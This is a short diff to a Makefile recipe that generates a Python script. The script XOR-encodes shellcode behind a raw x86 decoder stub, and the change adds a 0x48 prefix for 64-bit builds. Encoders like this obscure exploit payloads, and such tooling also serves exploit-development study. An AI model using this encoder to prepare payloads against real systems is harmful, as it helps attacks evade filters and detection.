@@ -165,6 +165,9 @@ xxd: hexdump # an alias #
 	@echo 'if l > 0xff:\n\tfrom struct import pack;set_ecx = "\x66\xb9" + pack("<H", l)\nelse:\n\tset_ecx = "\xb1" + chr(l)' >> $@
 	@echo 'xor_sc = "\x31\xc9" + set_ecx + "\xeb\x0a\x5e\x80\x74\x0e\xff" + rb + "\xe2\xf9\xeb\x05\xe8\xf1\xff\xff\xff"' >> $@
 	@echo 'xor_sc += "".join(chr(ord(c) ^ ord(rb)) for c in sc)' >> $@
+ifeq ($(ARCH), 64)
+	@echo 'xor_sc = "\x48" + xor_sc' >> $@
+endif
 	@echo 'print "xored shellcode (" + str(len(xor_sc)) + " bytes):"' >> $@
 	@echo 'print "\"" + "".join("\\\\x" + c.encode("hex") for c in xor_sc) + "\""' >> $@
 
